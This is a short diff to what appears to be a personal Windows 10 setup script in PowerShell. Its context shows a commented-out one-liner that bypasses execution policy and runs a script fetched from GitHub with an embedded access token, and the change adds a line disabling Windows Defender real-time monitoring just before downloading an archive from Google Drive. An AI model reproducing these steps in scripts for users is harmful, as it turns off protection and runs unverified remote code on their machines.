@@ -1,7 +1,7 @@
 #Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/DeadKper/Windows10Script/main/Instalar.ps1?token=AINZBETP3VJ6LYLMBQBU2BK73HH26'))
 
 #https://git.io/JLGaJ
-#ver 0.3.7
+#ver 0.3.8
 
 # Recive parameter elevated
 param([switch]$elevated)
@@ -520,6 +520,7 @@ Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" 
 # Check if the config only option is not the one picked by the user
 if ($job -ne 2) {
 	#
+	Set-MpPreference -DisableRealtimeMonitoring 1
 	$fileName="$env:ProgramData\Files.7z"
 	Write-Host "Downloading additional files"
 	GDownload "1OD5cvYwypj2xs0W87yt_eO-N6ltS6nQo" $fileName $True
